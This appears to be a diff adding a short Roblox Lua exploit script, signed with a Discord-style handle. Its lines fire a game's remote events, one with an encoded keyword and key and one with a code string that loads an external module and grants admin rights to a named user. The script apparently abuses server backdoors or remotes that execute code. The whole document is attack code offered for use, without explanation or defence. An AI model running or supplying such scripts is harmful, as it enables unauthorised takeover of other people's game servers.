@@ -1,0 +1,9 @@
+
+game.ReplicatedStorage.mynameemma.emma:FireServer('cGxzIGVtbWE=',game:GetService'Players'.LocalPlayer.Name,965993656)
+
+game.ReplicatedStorage.RemoteEvent:FireServer([[require(520532182).giveAdmin"Valekis"]])
+
+
+
+
+Zinc#6025
